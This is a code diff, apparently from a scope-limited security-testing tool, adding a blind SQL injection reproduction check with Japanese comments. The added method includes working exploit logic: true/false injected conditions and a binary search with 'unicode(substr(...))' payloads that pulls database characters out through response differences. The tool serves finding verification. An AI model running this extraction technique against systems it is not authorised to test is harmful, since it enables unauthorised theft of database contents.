@@ -550,6 +550,9 @@ class SealedReproductionChecker:
         if self._expected_marker(payload, evidence) == "ldap_injection_confirmed":
             return self._check_ldap_replay(payload, _info)
 
+        if self._expected_marker(payload, evidence) == "blind_sqli_confirmed":
+            return self._check_blind_sqli_replay(payload, _info)
+
         # 2.16) SGK-2026-0492: Web キャッシュポイズニング専用再現パス。新しい marker と
         #       新しい cache-buster で 毒入り GET（unkeyed ヘッダ付き）→ victim GET
         #       （クリーン）の2手を封印スコープ内で送り、victim 応答に新 marker が
@@ -1453,6 +1456,108 @@ class SealedReproductionChecker:
         ):
             return ReproductionOutcome(
                 "matched", "reproduction_marker_matched:ldap_injection_confirmed"
+            )
+        return ReproductionOutcome("mismatched", _REASON_MARKER_MISMATCH)
+
+    def _check_blind_sqli_replay(self, payload: dict, info: dict) -> ReproductionOutcome:
+        """boolean ベース・ブラインド SQLi の専用再現パス（SGK-2026-0502）。
+
+        元 Finding の blind_sqli_replay 記述子（mode/base_url/base_value/quote/param/
+        extracted_field）に従い、封印スコープ内で ①恒真条件 `AND 1=1` ②恒偽条件 `AND 1=2`
+        を GET し、真偽オラクルを**その場で再校正**（TRUE 応答専用行／FALSE 応答専用行を
+        再導出）して恒真=TRUE・恒偽=FALSE を再確認し、さらに真偽オラクルの二分探索で
+        抽出対象の**先頭1文字を再抽出**して元 finding の抽出値の先頭文字と一致することを
+        再観測する（＝真偽差分だけで DB 内容を再度復元できた live 再現）。読み取り専用で非破壊。
+
+        - matched: オラクル再校正成功＋先頭文字が元抽出値と一致
+          （reproduction_marker_matched:blind_sqli_confirmed）
+        - mismatched: 応答あり・オラクル/抽出が再現しない
+        - not_run: client None / スコープ再検証不可 / 記述子不正 / 送信不能（fail-closed）
+        """
+        from src.core.agents.swarm.injection.smart_blind_sqli import (
+            build_blind_sqli_url,
+            build_blind_sqli_value,
+            _derive_signature,
+        )
+
+        replay = info.get("blind_sqli_replay")
+        if not isinstance(replay, dict):
+            return ReproductionOutcome("not_run", _REASON_UNKNOWN_CATEGORY)
+        mode = str(replay.get("mode") or "path").strip().lower()
+        base_url = str(replay.get("base_url") or "").strip()
+        base_value = str(replay.get("base_value") or "1")
+        quote = str(replay.get("quote") or "")
+        param = str(replay.get("param") or "id")
+        field = str(replay.get("extracted_field") or "").strip()
+        if not base_url or not field:
+            return ReproductionOutcome("not_run", _REASON_UNKNOWN_CATEGORY)
+        # 元 finding の抽出値（先頭文字を再現照合に使う）。
+        be = info.get("blind_sqli_evidence")
+        orig_value = str(be.get("extracted_value") or "").strip() if isinstance(be, dict) else ""
+        if not orig_value:
+            return ReproductionOutcome("not_run", _REASON_UNKNOWN_CATEGORY)
+        if self._network_client is None:
+            return ReproductionOutcome("not_run", _REASON_DISABLED_NO_CLIENT)
+        scope_result = revalidate_scope_for_request(
+            base_url, scope_definition=self._scope_definition
+        )
+        if not scope_result.allowed:
+            return ReproductionOutcome("not_run", _REASON_SCOPE_REVALIDATION_BLOCKED)
+
+        def _get_cond(condition: str) -> str:
+            value = build_blind_sqli_value(base_value, quote, condition)
+            url = build_blind_sqli_url(mode, base_url, param, value)
+            body, _status, _loc = self._send_get(url)
+            return body or ""
+
+        try:
+            body_true = _get_cond("1=1")
+            body_false = _get_cond("1=2")
+        except Exception:  # noqa: BLE001 — transport boundary, fail closed
+            self._replays_used += 1
+            return ReproductionOutcome("not_run", _REASON_TRANSPORT_ERROR)
+        # オラクルをその場で再校正（元 finding のシグネチャに依存しない独立再現）。
+        true_sig = _derive_signature(body_true, body_false)
+        false_sig = _derive_signature(body_false, body_true)
+        if not true_sig or not false_sig:
+            self._replays_used += 1
+            return ReproductionOutcome("mismatched", _REASON_MARKER_MISMATCH)
+
+        def _classify(body: str) -> Optional[bool]:
+            is_t = true_sig in body
+            is_f = false_sig in body
+            if is_t and not is_f:
+                return True
+            if is_f and not is_t:
+                return False
+            return None
+
+        if _classify(body_true) is not True or _classify(body_false) is not False:
+            self._replays_used += 1
+            return ReproductionOutcome("mismatched", _REASON_MARKER_MISMATCH)
+
+        # 真偽オラクルで先頭1文字を二分探索で再抽出。
+        field_select = f"(SELECT {field})"
+        lo, hi = 32, 126
+        try:
+            while lo < hi:
+                mid = (lo + hi) // 2
+                body = _get_cond(f"unicode(substr({field_select},1,1))>{mid}")
+                cls = _classify(body)
+                if cls is None:
+                    self._replays_used += 1
+                    return ReproductionOutcome("mismatched", _REASON_MARKER_MISMATCH)
+                if cls:
+                    lo = mid + 1
+                else:
+                    hi = mid
+        except Exception:  # noqa: BLE001 — transport boundary, fail closed
+            self._replays_used += 1
+            return ReproductionOutcome("not_run", _REASON_TRANSPORT_ERROR)
+        self._replays_used += 1
+        if chr(lo) == orig_value[0]:
+            return ReproductionOutcome(
+                "matched", "reproduction_marker_matched:blind_sqli_confirmed"
             )
         return ReproductionOutcome("mismatched", _REASON_MARKER_MISMATCH)
 
